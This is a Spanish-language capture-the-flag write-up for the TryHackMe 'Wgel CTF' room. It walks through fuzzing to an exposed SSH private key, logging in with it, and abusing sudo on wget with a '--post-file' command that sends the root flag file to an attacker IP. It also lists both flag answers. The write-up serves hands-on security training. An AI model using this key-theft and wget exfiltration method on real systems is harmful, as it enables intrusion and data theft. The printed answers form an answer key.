# Wgel CTF

| **Dificultad** | Easy |
| **Tipo** | CTF (boot2root) |
| **Slug** | `wgelctf` |
| **Link** | [TryHackMe](https://tryhackme.com/room/wgelctf) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | nmap / fuzzing web / sitemap / .ssh/id_rsa / sudo wget / exfiltración de root |
| **Impacto** | CTF donde tras el escaneo y fuzzing se descubre el directorio `sitemap`, dentro un `.ssh` accesible vía la wordlist `common.txt` con una clave privada `id_rsa`. Tras entrar por SSH se abusa del permiso sudo sobre `wget` para usar `--post-file` y exfiltrar la flag de root hacia la máquina atacante. |

---

**Contexto:** La sala Wgel CTF despliega una máquina Linux. La resolución documentada: se hace fuzzing y se encuentra el directorio `sitemap`; volviendo a fuzgear encontramos un `.ssh` (usando la wordlist `common.txt`) en el que hay un `id_rsa` que podemos guardar. Con `chmod 600` e `ssh -i id_rsa` entramos a la máquina víctima. Ya dentro, `sudo -l` muestra que podemos ejecutar como root el comando `wget`, por lo que usamos `sudo /usr/bin/wget --post-file=/root/root_flag.txt <IP>` para subir la bandera a la máquina atacante. El usuario quedó accesible desde el entorno web inicial (SSH con la clave privada) y las flags pedidas son `user.txt` y `root.txt`.

## Solucionario

### Task 1: Reconocimiento y acceso (user.txt)

**Explicación:** Se escanea la máquina con nmap (puerto 80, sitios web). El fuzzing descubre `sitemap`, y dentro `.ssh` con el `id_rsa` de un usuario. Se conecta por SSH con la clave y se lee la primera flag (`user.txt`).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la flag de usuario (`user.txt`)? | `057c67131c3d5e42dd5cd3075b198ff6` |

### Task 2: Escalada de privilegios (root.txt)

**Explicación:** Dentro de la víctima, `sudo -l` muestra que podemos ejecutar como root `wget`. Para leer `root.txt`, se sube con `sudo /usr/bin/wget --post-file=/root/root_flag.txt <IP>` a la máquina atacante, donde se captura el cuerpo del POST y se lee la flag.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la flag de root (`root.txt`)? | `b1b968b37519ad1daa6408188649263d` |

---

**Metodología:** nmap → fuzzing de directorios (sitemap → .ssh con `common.txt`) → recolección de la clave `id_rsa` → SSH con clave privada → `sudo -l` (wget) → exfiltración vía `--post-file` → captura de la flag de root.
**Learning chain:** enumeración → descubrimiento del repositorio de claves → acceso SSH → abuso de sudo (wget post-file) → flag de root.
**MITRE ATT&CK:** T1046 (Network Service Discovery), T1083 (File and Directory Discovery), T1552.004 (Unsecured Credentials: Private Keys), T1059.004 (Unix Shell), T1041 (Exfiltration Over C2 Channel)
**Fuente:** [TryHackMe - Wgel CTF](https://tryhackme.com/room/wgelctf)